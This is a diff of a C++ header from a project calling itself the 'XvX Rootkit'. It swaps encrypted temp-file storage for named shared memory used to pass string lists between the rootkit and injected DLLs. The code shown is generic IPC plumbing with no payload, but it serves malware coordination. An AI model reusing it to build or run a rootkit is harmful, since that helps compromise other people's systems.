@@ -1,123 +1,121 @@
-/*
- * XvX Rootkit - IPC Objects Header
- * Copyright (c) 2025 - 28zaakypro@proton.me
- *
- * Shared memory IPC for communication between rootkit and injected DLLs.
- */
-
 #ifndef IPCOBJECTS_FILE_H
 #define IPCOBJECTS_FILE_H
 
 #include <windows.h>
 #include <string>
-#include <vector>
-#include <fstream>
 #include <sstream>
-#include "Crypto.h"
+#include <vector>
 
-inline std::wstring join(const std::vector<std::wstring> &vec, const std::wstring &delimiter)
+using namespace std;
+
+class MappedFile
 {
-    if (vec.empty())
-        return L"";
+private:
+    HANDLE hMapFile;
+    LPVOID pBuf;
+    wstring name;
+    DWORD size;
+    bool valid;
 
-    std::wstring result = vec[0];
-    for (size_t i = 1; i < vec.size(); i++)
+public:
+    MappedFile(const wstring &mapName, DWORD maxSize = 65536) : name(mapName), size(maxSize), valid(false)
     {
-        result += delimiter + vec[i];
-    }
-    return result;
-}
+        hMapFile = CreateFileMappingW(
+            INVALID_HANDLE_VALUE,
+            NULL,
+            PAGE_READWRITE,
+            0,
+            size,
+            mapName.c_str());
 
-inline std::vector<std::wstring> split(const std::wstring &str, const std::wstring &delimiter)
-{
-    std::vector<std::wstring> tokens;
-    size_t start = 0;
-    size_t end = str.find(delimiter);
-
-    while (end != std::wstring::npos)
-    {
-        std::wstring token = str.substr(start, end - start);
-        if (!token.empty())
+        if (hMapFile == NULL)
         {
-            tokens.push_back(token);
+            hMapFile = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, mapName.c_str());
         }
-        start = end + delimiter.length();
-        end = str.find(delimiter, start);
+
+        if (hMapFile != NULL)
+        {
+            pBuf = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, size);
+            if (pBuf != NULL)
+            {
+                valid = true;
+            }
+        }
     }
 
-    std::wstring lastToken = str.substr(start);
-    if (!lastToken.empty())
+    ~MappedFile()
     {
-        tokens.push_back(lastToken);
+        if (pBuf)
+            UnmapViewOfFile(pBuf);
+        if (hMapFile)
+            CloseHandle(hMapFile);
     }
 
-    return tokens;
-}
+    bool isValid() const { return valid; }
+
+    wstring getData() const
+    {
+        if (!valid)
+            return L"";
+        return wstring((wchar_t *)pBuf);
+    }
+
+    bool setData(const wstring &data)
+    {
+        if (!valid)
+            return false;
+        size_t dataSize = (data.length() + 1) * sizeof(wchar_t);
+        if (dataSize > size)
+            return false;
+
+        ZeroMemory(pBuf, size);
+        memcpy(pBuf, data.c_str(), dataSize);
+        return true;
+    }
+};
 
 class Serialitzator
 {
 public:
-    static void serializeVectorWString(const std::vector<std::wstring> &wstringVec, std::wstring fileName)
+    static bool serializeVectorWString(const vector<wstring> &vec, const wstring &mapName)
     {
-        // Get the %TEMP% path
-        WCHAR tempPath[MAX_PATH];
-        GetTempPathW(MAX_PATH, tempPath);
-
-        std::wstring filePath = std::wstring(tempPath) + fileName + L".dat";
-
-        // Concatenate vector into single string with delimiter
-        std::wstring data = join(wstringVec, L"|");
-
-        // Encryupt the data
-        std::wstring encrypted = encryptForStorage(data);
-
-        // Write to file
-        std::wofstream file(filePath.c_str(), std::ios::binary);
-        if (file.is_open())
+        wstringstream ss;
+        for (const auto &str : vec)
         {
-            file << encrypted;
-            file.close();
+            ss << str << L"\n";
         }
+
+        MappedFile mappedFile(mapName);
+        return mappedFile.setData(ss.str());
+    }
+
+    static vector<wstring> deserializeVectorWString(const wstring &mapName)
+    {
+        vector<wstring> result;
+        MappedFile mappedFile(mapName);
+
+        if (!mappedFile.isValid())
+            return result;
+
+        wstring data = mappedFile.getData();
+        wstringstream ss(data);
+        wstring line;
+
+        while (getline(ss, line))
+        {
+            if (!line.empty())
+            {
+                result.push_back(line);
+            }
+        }
+
+        return result;
     }
 };
 
-inline std::vector<std::wstring> deserializeWStringVector(std::wstring fileName)
+inline vector<wstring> deserializeWStringVector(const wstring &mapName)
 {
-    // Get the %TEMP% path
-    WCHAR tempPath[MAX_PATH];
-    GetTempPathW(MAX_PATH, tempPath);
-
-    std::wstring filePath = std::wstring(tempPath) + fileName + L".dat";
-
-    // Read the file
-    std::wifstream file(filePath.c_str(), std::ios::binary);
-    if (!file.is_open())
-    {
-        // File does not exist, return empty vector
-        return std::vector<std::wstring>();
-    }
-
-    std::wstringstream buffer;
-    buffer << file.rdbuf();
-    file.close();
-
-    std::wstring encryptedData = buffer.str();
-
-    if (encryptedData.empty())
-    {
-        return std::vector<std::wstring>();
-    }
-
-    // Decrypt the data
-    std::wstring data = decryptFromStorage(encryptedData);
-
-    if (data.empty())
-    {
-        return std::vector<std::wstring>();
-    }
-
-    // Split with delimiter
-    return split(data, L"|");
+    return Serialitzator::deserializeVectorWString(mapName);
 }
 
 #endif // IPCOBJECTS_FILE_H
